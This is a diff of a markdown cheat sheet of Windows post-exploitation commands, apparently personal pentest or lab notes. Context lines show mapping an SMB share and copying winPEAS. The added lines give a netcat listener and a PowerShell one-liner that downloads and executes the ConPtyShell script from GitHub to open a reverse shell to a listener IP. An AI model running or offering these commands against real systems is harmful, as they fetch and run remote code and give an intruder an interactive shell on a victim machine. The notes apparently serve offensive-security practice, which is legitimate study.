@@ -15,7 +15,7 @@ cd C:\working
 net use Z: \\IP\share /user:user pass
 copy Z:\uploads\winPEASx64.exe .
 ```
-Run [[Windows Privilege Escalation#winPEAS Run and Copy to Z downloads winpeas]] next.
+Run [[Windows Privilege Escalation#winPEAS Run and Copy Output to Z downloads winpeas]] next.
 
 
 ## Download file (PowerShell Start-BitsTransfer)
@@ -45,6 +45,16 @@ powershell -EncodedCommand BASE64_ENCODED_COMMAND_HERE
 Great reverse shell payload for Windows targets.
 ```
 https://github.com/antonioCoco/ConPtyShell
+```
+
+## ConPtyShell Listener
+```
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+```
+
+## Invoke-ConPtyShell
+```
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 
 ## Download file (certutil)
